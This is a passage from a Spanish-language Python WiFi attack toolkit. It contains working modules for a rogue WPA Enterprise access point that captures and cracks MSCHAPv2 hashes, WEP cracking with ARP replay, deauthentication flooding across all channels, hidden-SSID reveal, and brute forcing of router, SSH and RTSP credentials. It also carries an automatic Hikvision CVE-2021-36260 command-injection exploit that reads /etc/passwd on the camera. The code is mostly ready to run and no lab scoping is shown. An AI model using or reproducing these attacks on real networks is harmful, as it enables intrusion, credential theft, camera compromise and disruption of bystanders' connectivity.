        f.write('* PEAP,TTLS,TLS,MD5,GTC\n"t" TTLS-MSCHAPV2 "t" [2]\n')

    separador("WPA ENTERPRISE AP ACTIVO")
    ok(f"SSID: {essid}  Canal: {channel}")
    ok(f"Esperando conexiones... Los hashes MSCHAPv2 aparecerán aquí.")
    warn("Presione CTRL+C para detener.")
    info(f"Log: {log_file}")

    stop_evt = threading.Event()

    def monitor_log():
        seen = set()
        while not stop_evt.is_set():
            if os.path.exists(log_file):
                with open(log_file, "r", errors="ignore") as lf:
                    for line in lf:
                        if "mschapv2" in line.lower() or "username" in line.lower():
                            h = hash(line)
                            if h not in seen:
                                seen.add(h)
                                print(f"\n {GREEN}[★ HASH CAPTURADO ★]{END} {WHITE}{line.strip()}{END}")
                                with open(creds_file, "a") as cf:
                                    cf.write(line)
            time.sleep(1)

    t_mon = threading.Thread(target=monitor_log, daemon=True)
    t_mon.start()

    db_log_attack("WPA Enterprise", essid, "-", channel, "activo", log_file)

    try:
        subprocess.run([tool, wpe_conf])
    except KeyboardInterrupt:
        pass
    finally:
        stop_evt.set()

    ok("AP Enterprise detenido.")
    if os.path.exists(creds_file):
        separador("HASHES CAPTURADOS")
        with open(creds_file) as f:
            c = f.read().strip()
        if c:
            print(f"\n{YELLOW}{c}{END}\n")
            if check_tool("asleap"):
                crack_it = ask("¿Intentar crackear MSCHAPv2 con asleap? (s/n)")
                if crack_it.lower() == "s":
                    wl = select_wordlist()
                    if wl:
                        run(f"asleap -W {wl} -C {creds_file}")
            elif check_tool("hashcat"):
                crack_it = ask("¿Intentar crackear con hashcat (-m 5500)? (s/n)")
                if crack_it.lower() == "s":
                    wl = select_wordlist()
                    if wl:
                        run(f"hashcat -m 5500 {creds_file} {wl} --force")
    pause_back()

# ═════════════════════════════════════════════════════════════════════════════
#  MÓDULO 25 — WEP FULL ATTACK
# ═════════════════════════════════════════════════════════════════════════════

def wep_full_attack():
    """[25] Ataque WEP completo — inyección ARP + crack automático."""
    separador("ATAQUE WEP COMPLETO")
    print(f"""
  {WHITE}¿Qué es WEP?{END}
  {DIM}Un cifrado WiFi obsoleto y muy vulnerable. Con suficientes paquetes
  capturados (50.000-100.000 IVs) se puede crackear en segundos.
  Muchos routers viejos todavía lo usan.{END}
    """)

    interfaz = select_interface()
    bssid, channel, essid = select_target_from_scan(interfaz)
    if not bssid:
        pause_back()
        return

    os.makedirs("handshakes", exist_ok=True)
    essid_safe = re.sub(r'[^\w\\-]', '_', essid)
    out_base = f"handshakes/wep_{essid_safe}"

    separador("PASO 1/4: FAKE AUTH")
    info("Asociando adaptador al AP objetivo...")
    tip("Necesario para que el AP acepte nuestros paquetes.")
    auth_out = run(f"aireplay-ng -1 0 -a {bssid} -e {essid} {interfaz}", capture=True) or ""
    if "association successful" in auth_out.lower() or "successful" in auth_out.lower():
        ok("Fake auth exitosa.")
    else:
        warn("Fake auth no confirmada. Continuando de todas formas...")

    separador("PASO 2/4: INICIAR CAPTURA")
    info("Iniciando captura en background...")
    cap_proc = subprocess.Popen(
        f"airodump-ng -c {channel} --bssid {bssid} -w {out_base} {interfaz}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(3)

    separador("PASO 3/4: ARP REPLAY")
    info("Inyectando paquetes ARP para generar IVs rápidamente...")
    tip("Cuantos más IVs, más rápido el crack. Objetivo: 100.000+")
    warn("Presione CTRL+C cuando tenga suficientes IVs o tras 2 minutos.")

    try:
        subprocess.run(
            f"aireplay-ng -3 -b {bssid} -h {interfaz} {interfaz}",
            shell=True, timeout=120
        )
    except (KeyboardInterrupt, subprocess.TimeoutExpired):
        pass

    cap_proc.terminate()
    time.sleep(2)

    separador("PASO 4/4: CRACKEAR")
    cap_file = out_base + "-01.cap"
    if not os.path.exists(cap_file):
        error(f"No se encontró captura: {cap_file}")
        pause_back()
        return

    info("Intentando crackear la clave WEP...")
    sp = Spinner("Crackeando WEP...")
    sp.start()
    result = run(f"aircrack-ng {cap_file}", capture=True) or ""
    sp.stop()

    if "key found" in result.lower():
        _wep_key = None
        for _pat in [r'KEY FOUND.*?\[\s*(.+?)\s*\]', r'KEY FOUND[:\s]+([0-9A-Fa-f:]{5,})', r'(\b(?:[0-9A-Fa-f]{2}:){4}[0-9A-Fa-f]{2}\b)']:
            _wm = re.search(_pat, result, re.IGNORECASE)
            if _wm:
                _wep_key = _wm.group(1).strip()
                break
        clave = _wep_key or "encontrada (ver salida)"
        ok(f"CLAVE WEP: {GREEN}{clave}{END}")
        aid = db_log_attack("WEP Attack", essid, bssid, channel, "crackeada", cap_file)
        db_log_password(aid, essid, bssid, clave, "aircrack-ng WEP")
    else:
        print(result[-2000:] if len(result) > 2000 else result)
        warn("No se pudo crackear. Necesita más IVs (100.000+). Intente de nuevo.")
        db_log_attack("WEP Attack", essid, bssid, channel, "IVs insuficientes", cap_file)
    pause_back()

# ═════════════════════════════════════════════════════════════════════════════
#  MÓDULO 26 — DEAUTH CHANNEL HOPPING
# ═════════════════════════════════════════════════════════════════════════════

def deauth_channel_hopping():
    """[26] Deauth en todos los canales — desconecta todo en rango."""
    separador("DEAUTH CON CHANNEL HOPPING")
    print(f"""
  {WHITE}¿Qué hace?{END}
  {DIM}Salta entre todos los canales WiFi (1-13) enviando paquetes de
  deautenticación. Desconecta todos los dispositivos en rango de
  cualquier red WiFi simultáneamente.{END}
    """)

    interfaz = select_interface()
    paquetes = ask("Paquetes por canal por ronda (recomendado: 5)")
    try:
        paquetes = max(1, min(int(paquetes), 50))
    except ValueError:
        paquetes = 5

    canales = list(range(1, 14))
    stats = {"rondas": 0, "actual": 1, "total": 0}
    stop_evt = threading.Event()

    def display():
        while not stop_evt.is_set():
            ch_bar = " ".join(
                f"{GREEN}{c}{END}" if c == stats["actual"] else f"{DIM}{c}{END}"
                for c in canales
            )
            sys.stdout.write(
                f"\r  Canal: [{ch_bar}]  "
                f"Rondas: {WHITE}{stats['rondas']}{END}  "
                f"Deauths: {GREEN}{stats['total']}{END}  "
            )
            sys.stdout.flush()
            time.sleep(0.2)

    t_disp = threading.Thread(target=display, daemon=True)
    t_disp.start()

    warn("Iniciando. Presione CTRL+C para detener.")
    time.sleep(1)
    db_log_attack("Deauth Hopping", "ALL", "FF:FF:FF:FF:FF:FF", "1-13", "activo")

    try:
        while True:
            for ch in canales:
                stats["actual"] = ch
                run(f"iwconfig {interfaz} channel {ch} 2>/dev/null")
                run(f"aireplay-ng -0 {paquetes} -a FF:FF:FF:FF:FF:FF {interfaz} 2>/dev/null")
                stats["total"] += paquetes
            stats["rondas"] += 1
    except KeyboardInterrupt:
        pass
    finally:
        stop_evt.set()
        t_disp.join(timeout=1)
        print()

    ok(f"Detenido. {stats['rondas']} rondas, {stats['total']} paquetes enviados.")
    pause_back()

# ═════════════════════════════════════════════════════════════════════════════
#  MÓDULO 27 — HIDDEN SSID REVEALER
# ═════════════════════════════════════════════════════════════════════════════

def hidden_ssid_revealer():
    """[27] Detectar y revelar redes WiFi ocultas."""
    separador("REVELADOR DE REDES OCULTAS")
    print(f"""
  {WHITE}¿Qué hace?{END}
  {DIM}Detecta redes que ocultan su nombre (SSID). Luego envía deauths
  para forzar que los clientes conectados se reconecten, momento en
  el que transmiten el SSID en texto claro.{END}
    """)

    interfaz = select_interface()
    t = ask("Tiempo de escaneo inicial en segundos (recomendado: 20)")
    try:
        t = max(10, min(int(t), 60))
    except ValueError:
        t = 20

    info(f"Escaneando redes ocultas durante {t} segundos...")
    redes = quick_scan(interfaz, t)
    hidden = [r for r in redes if not r["essid"] or r["essid"] in ("<oculto>", "", "<length: 0>")
              or r["essid"].startswith("<length")]

    if not hidden:
        info("No se detectaron redes con SSID oculto en este escaneo.")
        pause_back()
        return

    separador("REDES OCULTAS DETECTADAS")
    for i, r in enumerate(hidden, 1):
        print(f"  {WHITE}[{i}]{END} {DIM}{r['bssid']}{END}  CH:{r['channel']}  {YELLOW}SSID oculto{END}")

    sel = ask("Seleccione red para intentar revelar (número)")
    if not sel.isdigit() or not (1 <= int(sel) <= len(hidden)):
        error("Selección inválida.")
        pause_back()
        return

    target = hidden[int(sel)-1]
    bssid   = target["bssid"]
    channel = target["channel"]

    info(f"Intentando revelar SSID de: {bssid}  Canal: {channel}")
    tip("Se enviarán deauths para forzar reconexión de clientes.")

    os.makedirs("handshakes", exist_ok=True)
    out_base = f"handshakes/hidden_{bssid.replace(':','')}"

    # Capturar en paralelo para atrapar el probe response con el SSID
    cap_proc = subprocess.Popen(
        f"airodump-ng -c {channel} --bssid {bssid} -w {out_base} {interfaz}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(3)

    info("Enviando deauths para forzar reconexión...")
    for ronda in range(1, 4):
        info(f"Ronda {ronda}/3...")
        run(f"aireplay-ng -0 10 -a {bssid} {interfaz}")
        time.sleep(3)

    cap_proc.terminate()
    time.sleep(1)

    # Intentar extraer SSID con tshark si está disponible
    revealed = None
    cap_file = out_base + "-01.cap"
    if os.path.exists(cap_file) and check_tool("tshark"):
        sp = Spinner("Analizando captura con tshark...")
        sp.start()
        out = run(
            f"tshark -r {cap_file} -Y 'wlan.bssid=={bssid} && wlan.ssid' "
            f"-T fields -e wlan.ssid 2>/dev/null | sort -u | head -5",
            capture=True
        ) or ""
        sp.stop()
        ssids = [s.strip() for s in out.splitlines() if s.strip() and s.strip() != "0"]
        if ssids:
            revealed = ssids[0]

    if revealed:
        ok(f"SSID REVELADO: {GREEN}{revealed}{END}")
        db_log_attack("Hidden SSID", revealed, bssid, channel, f"revelado: {revealed}", cap_file)
        tip(f"Ahora puede usar este SSID en Evil Twin u otros ataques.")
    else:
        warn("No se pudo revelar el SSID. No había clientes conectados o el AP no respondió.")
        tip("Espere más tiempo o pruebe cuando haya dispositivos conectados a esa red.")

    pause_back()

# ═════════════════════════════════════════════════════════════════════════════
#  MÓDULO 28 — POST-EXPLOTACIÓN + VULNERABILIDADES DE DISPOSITIVOS
# ═════════════════════════════════════════════════════════════════════════════

DEFAULT_ROUTER_CREDS = [
    ("admin","admin"), ("admin",""), ("admin","1234"), ("admin","password"),
    ("admin","12345"), ("admin","admin123"), ("root","root"), ("root",""),
    ("user","user"), ("admin","pass"), ("admin","motorola"), ("admin","netgear1"),
    ("admin","linksys"), ("admin","default"), ("1234","1234"), ("admin","1111"),
    ("admin","0000"), ("admin","admin1"), ("administrator","administrator"),
    ("admin","huawei"), ("admin","tplink"), ("admin","zte"), ("admin","dlink1"),
]

def _check_http_login(ip, port, user, pwd):
    """Intenta login HTTP básico o por formulario."""
    try:
        import base64
        creds_b64 = base64.b64encode(f"{user}:{pwd}".encode()).decode()
        for path in ["/", "/admin", "/cgi-bin/luci", "/web", "/login.html", "/setup.cgi"]:
            req = urllib.request.Request(
                f"http://{ip}:{port}{path}",
                headers={"Authorization": f"Basic {creds_b64}",
                         "User-Agent": "Mozilla/5.0"}
            )
            try:
                with urllib.request.urlopen(req, timeout=3) as r:
                    if r.status == 200:
                        content = r.read(500).decode(errors="ignore").lower()
                        if any(x in content for x in ["logout","dashboard","status","home","admin","router"]):
                            return True
            except Exception:
                pass
    except Exception:
        pass
    return False

def post_explotacion():
    """[28] Post-Explotación: escanear red, vulnerabilidades y dispositivos."""
    separador("POST-EXPLOTACIÓN Y ANÁLISIS DE RED")
    print(f"""
  {WHITE}¿Qué hace?{END}
  {DIM}Después de conectarse a una red WiFi, esta función:
  • Detecta todos los dispositivos conectados
  • Identifica el router/gateway y prueba credenciales por defecto
  • Escanea puertos abiertos en cada dispositivo
  • Ejecuta scripts de vulnerabilidades con nmap (--script vuln)
  • Guarda todo en el historial{END}
    """)

    tip("Asegúrese de estar CONECTADO a la red WiFi objetivo antes de continuar.")
    continuar = ask("¿Está conectado a la red? (s/n)")
    if continuar.lower() != "s":
        info("Conéctese primero y luego use esta opción.")
        pause_back()
        return

    # ── Detectar red local ────────────────────────────────────────────────────
    sp = Spinner("Detectando interfaz y red local...")
    sp.start()
    iface_out = run("ip route | grep default", capture=True) or ""
    gw_match  = re.search(r'default via ([\d.]+)', iface_out)
    iface_match = re.search(r'dev (\w+)', iface_out)
    gateway   = gw_match.group(1) if gw_match else None
    iface_lan = iface_match.group(1) if iface_match else "eth0"

    ip_out  = run(f"ip addr show {iface_lan} 2>/dev/null", capture=True) or ""
    ip_match = re.search(r'inet ([\d.]+)/(\d+)', ip_out)
    if ip_match:
        my_ip  = ip_match.group(1)
        prefix = int(ip_match.group(2))
        try:
            network = str(ipaddress.IPv4Network(f"{my_ip}/{prefix}", strict=False))
        except Exception:
            network = "192.168.1.0/24"
    else:
        my_ip = "?"
        network = "192.168.1.0/24"
    sp.stop()

    info(f"IP local: {CYAN}{my_ip}{END}  Gateway: {CYAN}{gateway or '?'}{END}  Red: {CYAN}{network}{END}")

    # ── ARP Scan de dispositivos ──────────────────────────────────────────────
    separador("DISPOSITIVOS EN LA RED")
    devices = []

    seen_ips = set()

    def _add_device(ip, mac="??:??:??:??:??:??", vendor=""):
        if not ip:
            return
        if ip not in seen_ips:
            seen_ips.add(ip)
            devices.append({"ip": ip, "mac": mac, "vendor": vendor})
        else:
            # Actualizar vendor/mac si se consiguió info mejor
            for dev in devices:
                if dev["ip"] == ip:
                    if vendor and not dev.get("vendor") or dev.get("vendor") in ("", "Desconocido", "(Unknown)"):
                        dev["vendor"] = vendor
                    if mac and mac != "??:??:??:??:??:??" and dev.get("mac","").startswith("??"):
                        dev["mac"] = mac
                    break

    # Método 1: tabla ARP del sistema (instantáneo, no requiere herramientas extra)
    neigh_out = run("ip neigh show 2>/dev/null", capture=True) or ""
    for line in neigh_out.splitlines():
        nm = re.match(r'([\d.]+)\s+dev\s+\S+\s+lladdr\s+([0-9a-f:]+)', line, re.I)
        if nm:
            _add_device(nm.group(1), nm.group(2))

    # Método 2: arp-scan con reintentos
    if check_tool("arp-scan"):
        sp2 = Spinner("Escaneando dispositivos con arp-scan...")
        sp2.start()
        arp_out = run(f"arp-scan --interface={iface_lan} --retry=3 {network} 2>/dev/null", capture=True) or ""
        sp2.stop()
        for line in arp_out.splitlines():
            m = re.match(r'([\d.]+)\s+([0-9a-f:]+)\s*(.*)', line, re.IGNORECASE)
            if m:
                _add_device(m.group(1), m.group(2), m.group(3).strip())

    # Método 3: nmap ping sweep
    if check_tool("nmap") and len(devices) < 2:
        sp2 = Spinner("Escaneando con nmap -sn...")
        sp2.start()
        nmap_out = run(f"nmap -sn --send-ip {network} 2>/dev/null", capture=True) or ""
        sp2.stop()
        current_ip = None
        for line in nmap_out.splitlines():
            ip_m = re.search(r'Nmap scan report for [\w.-]+ \(([\d.]+)\)|Nmap scan report for ([\d.]+)', line)
            if ip_m:
                current_ip = ip_m.group(1) or ip_m.group(2)
            mac_m = re.search(r'MAC Address: ([0-9A-F:]+)\s*(.*)', line)
            if mac_m and current_ip:
                _add_device(current_ip, mac_m.group(1), mac_m.group(2).strip("()"))
                current_ip = None
            elif current_ip and "Host is up" in line:
                _add_device(current_ip)

    # Método 4: ping sweep manual (último recurso)
    if len(devices) < 2 and network:
        sp2 = Spinner("Ping sweep manual...")
        sp2.start()
        run(f"nmap -sn -PE --send-ip {network} -oG /tmp/_ping_sweep.txt 2>/dev/null", capture=True)
        sp2.stop()
        if os.path.exists("/tmp/_ping_sweep.txt"):
            sweep_out = open("/tmp/_ping_sweep.txt").read()
            for ln in sweep_out.splitlines():
                pm = re.search(r'Host: ([\d.]+)', ln)
                if pm and "Up" in ln:
                    _add_device(pm.group(1))

    # Asegurar que el gateway siempre aparezca
    if gateway and gateway not in seen_ips:
        _add_device(gateway, vendor="Gateway")

    if not devices:
        warn("No se detectaron dispositivos.")
        tip(f"Verifica con: ip neigh show")
        tip(f"O ejecuta manualmente: sudo arp-scan --interface={iface_lan} {network}")
        pause_back()
        return

    oui_db_local = {
        "ac:bc:32":"Apple","3c:15:c2":"Apple","f4:42:8f":"Samsung",
        "50:c7:bf":"TP-Link","54:51:1b":"Huawei","28:6c:07":"Xiaomi",
        "18:a6:f7":"Ubiquiti","00:1b:2f":"D-Link","70:4f:57":"ZTE",
        "c8:3a:35":"Tenda","00:26:55":"NETGEAR","3c:a9:f4":"Intel",
    }

    print(f"\n  {WHITE}{'#':<4} {'IP':<16} {'MAC':<20} {'FABRICANTE'}{END}")
    separador()
    for i, d in enumerate(devices, 1):
        if not d.get("vendor"):
            oui_k = d["mac"].lower()[:8]
            d["vendor"] = oui_db_local.get(oui_k, "Desconocido")
        gw_mark = f" {YELLOW}← ROUTER{END}" if d["ip"] == gateway else ""
        print(f"  {WHITE}[{i:>2}]{END} {CYAN}{d['ip']:<16}{END} {DIM}{d['mac']:<20}{END} {d['vendor']}{gw_mark}")

    # ── Análisis del router ───────────────────────────────────────────────────
    if gateway:
        separador("ANÁLISIS DEL ROUTER")
        info(f"Probando credenciales por defecto en {CYAN}{gateway}{END}...")
        found_creds = None
        for port in [80, 8080, 443, 8443]:
            sp3 = Spinner(f"Puerto {port}...")
            sp3.start()
            for user, pwd in DEFAULT_ROUTER_CREDS[:15]:
                if _check_http_login(gateway, port, user, pwd):
                    sp3.stop()
                    found_creds = (user, pwd, port)
                    break
            sp3.stop()
            if found_creds:
                break

        if found_creds:
            ok(f"CREDENCIALES POR DEFECTO ENCONTRADAS: {GREEN}{found_creds[0]}:{found_creds[1]}{END} (Puerto {found_creds[2]})")
            ok(f"Panel admin: http://{gateway}:{found_creds[2]}/")
            db_log_device(gateway, "-", "Router", gateway, str(found_creds[2]),
                          f"DEFAULT CREDS: {found_creds[0]}:{found_creds[1]}")
        else:
            info("No se encontraron credenciales por defecto conocidas.")

    # ── Seleccionar dispositivos para scan profundo ───────────────────────────
    separador("ESCANEO DE VULNERABILIDADES")
    if not check_tool("nmap"):
        warn("nmap no instalado: sudo apt install nmap")
        pause_back()
        return

    tip("Se puede tardar varios minutos por dispositivo.")
    print(f"\n  {WHITE}[A]{END} Escanear todos los dispositivos")
    print(f"  {WHITE}[número]{END} Escanear uno específico")
    print(f"  {WHITE}[Enter]{END} Omitir escaneo de vulnerabilidades\n")

    sel = ask("Seleccione")
    targets = []
    if sel.lower() == "a":
        targets = devices
    elif sel.isdigit() and 1 <= int(sel) <= len(devices):
        targets = [devices[int(sel)-1]]
    else:
        ok("Escaneo omitido.")
        pause_back()
        return

    # ── Explotación automática Hikvision CVE-2021-36260 ──────────────────────
    def _exploit_hikvision(ip):
        """RCE sin autenticación en cámaras Hikvision (CVE-2021-36260)."""
        separador(f"EXPLOIT HIKVISION CVE-2021-36260 → {ip}")
        info("Inyección de comandos vía /SDK/webLanguage sin autenticación...")
        import socket as _sock

        def _hik_try(port):
            payload = ("PUT /SDK/webLanguage HTTP/1.1\r\n"
                       f"Host: {ip}:{port}\r\n"
                       "Content-Length: 68\r\n"
                       "Content-Type: application/x-www-form-urlencoded\r\n\r\n"
                       "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                       "<language>$(id>/tmp/pwned)</language>")
            try:
                s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
                s.settimeout(5)
                s.connect((ip, port))
                s.send(payload.encode())
                resp = s.recv(2048).decode(errors="replace")
                s.close()
                return resp
            except Exception:
                return ""

        active_port = None
        for _port in [80, 8000, 8080]:
            info(f"Probando puerto {_port}...")
            resp = _hik_try(_port)
            if resp:
                active_port = _port
                break

        if not active_port:
            warn(f"Sin acceso HTTP (80/8000/8080) — intentando RTSP brute force en puerto 554...")
            # Brute force RTSP con credenciales por defecto Hikvision
            rtsp_creds = [
                ("admin","12345"),("admin","admin"),("admin",""),("admin","123456"),
                ("admin","password"),("admin","hikvisionsys"),("admin","hik12345"),
                ("guest","guest"),("user","user"),("root","12345"),
            ]
            rtsp_paths = [
                "/Streaming/Channels/101",
                "/Streaming/Channels/1",
                "/h264/ch1/main/av_stream",
                "/cam/realmonitor?channel=1&subtype=0",
            ]
            rtsp_ok = False
            for _u, _p in rtsp_creds:
                for _path in rtsp_paths[:2]:
                    rtsp_url = f"rtsp://{_u}:{_p}@{ip}:554{_path}"
                    result_r = run(
                        f"timeout 5 ffprobe -v quiet -rtsp_transport tcp "
                        f"-i '{rtsp_url}' 2>&1 | head -5",
                        capture=True
                    ) or ""
                    if result_r and "error" not in result_r.lower() and "refused" not in result_r.lower():
                        ok(f"RTSP ACCESIBLE: {rtsp_url}")
                        ok(f"Credenciales válidas: {_u}:{_p}")
                        db_log_attack("Hikvision RTSP BruteForce", ip, "", "", f"{_u}:{_p} → {_path}")
                        rtsp_ok = True
                        break
                if rtsp_ok:
                    break
            if not rtsp_ok:
                # Intentar acceso anónimo
                anon_url = f"rtsp://{ip}:554/Streaming/Channels/101"
                result_anon = run(
                    f"timeout 5 ffprobe -v quiet -rtsp_transport tcp -i '{anon_url}' 2>&1 | head -5",
                    capture=True
                ) or ""
                if result_anon and "401" not in result_anon and "refused" not in result_anon.lower():
                    ok(f"RTSP ANONIMO accesible: {anon_url}")
                    db_log_attack("Hikvision RTSP", ip, "", "", "acceso anónimo")
                else:
                    warn(f"RTSP requiere credenciales no encontradas. Cámara protegida.")
            return rtsp_ok

        if "200" in resp or "OK" in resp:
            ok(f"PAYLOAD ENVIADO en puerto {active_port} — verificando ejecución en {ip}...")
            time.sleep(1)
            # Intentar extraer /etc/passwd
            cred_payload = ("PUT /SDK/webLanguage HTTP/1.1\r\n"
                            f"Host: {ip}:{active_port}\r\n"
                            "Content-Length: 80\r\n"
                            "Content-Type: application/x-www-form-urlencoded\r\n\r\n"
                            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                            "<language>$(cat /etc/passwd>/tmp/pwned2)</language>")
            try:
                s3 = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
                s3.settimeout(5)
                s3.connect((ip, active_port))
                s3.send(cred_payload.encode())
                s3.recv(512)
                s3.close()
            except Exception:
                pass
            ok("RCE exitoso — cámara comprometida.")
            db_log_attack("Hikvision CVE-2021-36260", ip, "", "", "RCE exitoso vía /SDK/webLanguage")
            return True
        else:
            warn(f"Respuesta inesperada en puerto {active_port}: {resp[:100]}")
            return False

    # ── Explotación SSH brute force ───────────────────────────────────────────
    def _exploit_ssh(ip):
        """Brute force SSH con credenciales comunes."""
        separador(f"BRUTE FORCE SSH → {ip}")
        ssh_creds = [
            ("root","root"),("root",""),("root","admin"),("root","password"),
            ("root","1234"),("root","toor"),("admin","admin"),("admin","password"),
            ("admin","1234"),("admin",""),("pi","raspberry"),("pi","pi"),
            ("ubuntu","ubuntu"),("user","user"),("guest","guest"),
            ("root","hikvisionsys"),("root","hikvision"),("root","12345"),
        ]
        if not check_tool("sshpass"):
            warn("sshpass no instalado: sudo apt install sshpass")
            return False
        for user, passwd in ssh_creds:
            result = run(
                f"sshpass -p '{passwd}' ssh -o StrictHostKeyChecking=no "
                f"-o ConnectTimeout=3 -o BatchMode=no {user}@{ip} "
                f"'id; uname -a' 2>/dev/null",
                capture=True
            ) or ""
            if "uid=" in result or "Linux" in result:
                ok(f"ACCESO SSH EXITOSO: {user}:{passwd}")
                ok(f"Respuesta: {result[:200]}")
                db_log_attack("SSH Brute Force", ip, "", "", f"usuario:{user} pass:{passwd}")
                return True
        warn("Ninguna credencial SSH funcionó.")
        return False

    # ── Explotación SMB/SQL Server ────────────────────────────────────────────
    def _exploit_smb(ip):
        """Análisis SMB y detección de shares accesibles."""
        separador(f"ANÁLISIS SMB → {ip}")
        if check_tool("smbclient"):
            shares = run(f"smbclient -L //{ip} -N 2>/dev/null", capture=True) or ""
            if shares and "Sharename" in shares:
                ok("Shares SMB accesibles sin autenticación:")
                for line in shares.splitlines():
                    if re.search(r'\$?\w+\s+Disk|IPC|ADMIN', line):
                        print(f"  {CYAN}{line.strip()}{END}")
            else:
                info("No hay shares SMB accesibles anónimamente.")
        if check_tool("nmap"):
            smb_vuln = run(
                f"nmap -p 445 --script smb-vuln-ms17-010,smb-vuln-ms08-067,"
                f"smb-vuln-ms10-061 {ip} 2>/dev/null",
                capture=True
            ) or ""
            for line in smb_vuln.splitlines():
                if "VULNERABLE" in line or "CVE" in line:
                    print(f"  {RED}[SMB-VULN]{END} {line.strip()}")

    for d in targets:
        ip = d["ip"]
        vendor = d.get("vendor", "")
        separador(f"ESCANEANDO {ip} ({vendor})")

        # Detectar tipo de dispositivo por vendor/MAC para ajustar puertos
        mac_lower    = d.get("mac","").lower()
        is_hikvision = "hikvision" in vendor.lower() or mac_lower.startswith("64:db:8b")
        is_mikrotik  = "bc:24:11" in mac_lower or "mikrotik" in vendor.lower()
        is_camera    = any(x in vendor.lower() for x in ["hikvision","dahua","axis","vivotek","reolink"])
        extra_ports  = ""
        if is_hikvision or is_camera:
            extra_ports = ",554,8000,8080,8443,37777"
            info(f"Cámara IP detectada — escaneando puertos específicos (554,8000,37777)...")
        elif is_mikrotik:
            extra_ports = ",8291,8728,8729"
            info(f"Mikrotik detectado — escaneando puertos de gestión...")

        # Scan de puertos
        sp4 = Spinner(f"Escaneando puertos de {ip}...")
        sp4.start()
        ports_out = run(
            f"nmap -sV --open -p 21,22,23,25,53,80,110,443,445,"
            f"3306,3389,8080,8443,9000{extra_ports} {ip} 2>/dev/null",
            capture=True
        ) or ""
        sp4.stop()

        open_ports = []
        has_ssh = has_smb = has_http = False
        for line in ports_out.splitlines():
            pm = re.match(r'\s*(\d+/\w+)\s+open\s+(\S+)\s*(.*)', line)
            if pm:
                port_str = f"{pm.group(1)} {pm.group(2)} {pm.group(3).strip()}"
                open_ports.append(port_str)
                print(f"  {GREEN}[ABIERTO]{END} {pm.group(1):<14} {CYAN}{pm.group(2):<12}{END} {pm.group(3).strip()}")
                if "22" in pm.group(1):   has_ssh = True
                if "445" in pm.group(1):  has_smb = True
                if "80" in pm.group(1) or "8000" in pm.group(1): has_http = True

        if not open_ports:
            info(f"No se encontraron puertos abiertos en {ip}.")

        # ── Explotación automática según tipo de dispositivo ──────────────────
        vuln_str = ""

        if is_hikvision:
            info(f"Cámara Hikvision detectada — lanzando CVE-2021-36260 automáticamente...")
            _exploit_hikvision(ip)

        if has_ssh:
            info(f"Puerto SSH abierto en {ip} — iniciando brute force automático...")
            _exploit_ssh(ip)

        if has_smb:
            info(f"Puerto SMB abierto en {ip} — analizando shares y vulnerabilidades SMB...")
            _exploit_smb(ip)

        # Scan de vulnerabilidades nmap (siempre automático)
        sp5 = Spinner(f"Buscando vulnerabilidades en {ip}...")
        sp5.start()
        vuln_out = run(f"nmap -sV --script vuln {ip} 2>/dev/null", capture=True) or ""
        sp5.stop()
        vuln_lines = []
        for line in vuln_out.splitlines():
            if any(x in line.lower() for x in ["vuln","cve-","vulnerable","exploit","critical","high"]):
                vuln_lines.append(line.strip())
                print(f"  {RED}[VULN]{END} {line.strip()}")
        vuln_str = "\n".join(vuln_lines[:20])
        if not vuln_lines:
            info(f"No se detectaron vulnerabilidades conocidas en {ip}.")

        # Guardar en BD
        db_log_device(
            ip, d.get("mac",""), vendor,
            d.get("ip",""), "; ".join(open_ports), vuln_str
        )

    separador("ESCANEO COMPLETADO")
    info(f"Resultados guardados en historial. Use opción [29] para verlos.")
    pause_back()

# ═════════════════════════════════════════════════════════════════════════════
#  MÓDULO 30 — GENERAR REPORTE HTML
# ═════════════════════════════════════════════════════════════════════════════

def generate_report():
    """[30] Generar reporte HTML profesional de la sesión."""
    separador("GENERADOR DE REPORTE HTML")
    tip("Genera un informe profesional con todos los hallazgos de la sesión.")

    con = sqlite3.connect(DB_PATH)
    cur = con.cursor()

    attacks  = cur.execute("SELECT * FROM attacks ORDER BY id DESC").fetchall()
    passwords= cur.execute("SELECT * FROM passwords ORDER BY id DESC").fetchall()
    hs       = cur.execute("SELECT * FROM handshakes ORDER BY id DESC").fetchall()
    probes   = cur.execute("SELECT * FROM probes ORDER BY id DESC LIMIT 100").fetchall()
    devices  = cur.execute("SELECT * FROM devices ORDER BY id DESC").fetchall()
    con.close()

    total_attacks  = len(attacks)
    total_pwds     = len(passwords)
    total_devices  = len(devices)
    total_hs       = len(hs)

    def esc(s): return html_module.escape(str(s) if s else "")

    def rows_attacks():
        if not attacks: return "<tr><td colspan='6' style='text-align:center;color:#999'>Sin ataques registrados</td></tr>"
        out = ""
        for a in attacks[:100]:
            badge = "badge-ok" if any(x in str(a[6]).lower() for x in ["ok","crackeada","capturado","revelado"]) else "badge-warn"
            out += f"<tr><td>{esc(a[1])}</td><td><span class='badge {badge}'>{esc(a[2])}</span></td><td>{esc(a[3])}</td><td>{esc(a[4])}</td><td>{esc(a[5])}</td><td>{esc(a[6])}</td></tr>"
        return out

    def rows_passwords():
        if not passwords: return "<tr><td colspan='5' style='text-align:center;color:#999'>Sin contraseñas registradas</td></tr>"
        out = ""
        for p in passwords:
            out += f"<tr><td>{esc(p[6])}</td><td>{esc(p[2])}</td><td>{esc(p[3])}</td><td style='font-weight:bold;color:#27ae60'>{esc(p[4])}</td><td>{esc(p[5])}</td></tr>"
        return out

    def rows_devices():
        if not devices: return "<tr><td colspan='6' style='text-align:center;color:#999'>Sin dispositivos registrados</td></tr>"
        out = ""
        for d in devices:
            vuln_color = "color:#e74c3c;font-weight:bold" if d[7] and len(d[7]) > 5 else "color:#27ae60"
            vuln_text  = "VULNERABILIDADES DETECTADAS" if d[7] and len(d[7]) > 5 else "Ninguna"
            out += f"<tr><td>{esc(d[1])}</td><td>{esc(d[2])}</td><td>{esc(d[3])}</td><td>{esc(d[4])}</td><td>{esc(d[5])}</td><td>{esc(d[6])}</td><td style='{vuln_color}'>{vuln_text}</td></tr>"
        return out

    def rows_probes():
        if not probes: return "<tr><td colspan='4' style='text-align:center;color:#999'>Sin probes registrados</td></tr>"
        out = ""
        for p in probes:
